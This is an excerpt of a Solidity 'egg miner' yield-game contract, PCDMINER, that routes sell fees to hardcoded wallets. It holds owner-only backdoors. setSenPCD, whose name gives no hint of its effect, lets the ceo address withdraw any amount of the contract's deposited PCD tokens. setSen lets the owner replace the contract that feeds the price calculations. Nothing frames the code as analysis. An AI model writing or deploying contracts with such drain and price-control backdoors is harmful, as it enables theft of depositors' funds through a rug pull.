...
contract PCDMINER is Ownable{
    ...
    function sellEggs() public{
        ...
        //marketEggs=SafeMath.add(a,hasEggs);
        //IERC20(tokenPCD).transfer(msg.sender,value*10**18);
        //safeTransfer(ceoAddress, fee); 10 LPfen
        //safeTransfer(msg.sender, SafeMath.sub(eggValue,fee));
        //0x1A915bEA1eBc398Fb02d437533C06c021dEe53BF
        IERC20(tokenPCD).transfer(0x1A915bEA1eBc398Fb02d437533C06c021dEe53BF,fee*60/100);
        IERC20(tokenPCD).transfer(0x9f8fE7A2215eD1a1eB1285F9aE97C3B6c6552398,fee*30/100);
        IERC20(tokenPCD).transfer(ceoAddress,fee*10/100);
        IERC20(tokenPCD).transfer(msg.sender,SafeMath.sub(eggValue,fee));
    }
    function getUsdtMinr(address addr)public view returns(uint,uint,uint){
        uint a=PcdUsdt(PCDUSDT).marketEggs();
    ...
    function calculateEggSell(uint256 eggs) public view returns(uint256){
        return calculateTrade(eggs,PcdUsdt(PCDUSDT).marketEggs(),PCD.balanceOf(address(this))) * 2;
    }
    function calculateEggBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth,contractBalance,PcdUsdt(PCDUSDT).marketEggs());
    }
    ...
    function setSen(address addr)public{
        require(msg.sender == ceoAddress);
        PCDUSDT=addr;
    }
    function setSenPCD(address addr,uint value)public{
        require(msg.sender == ceoAddress);
        IERC20(tokenPCD).transfer(msg.sender,value*10**18);
    }
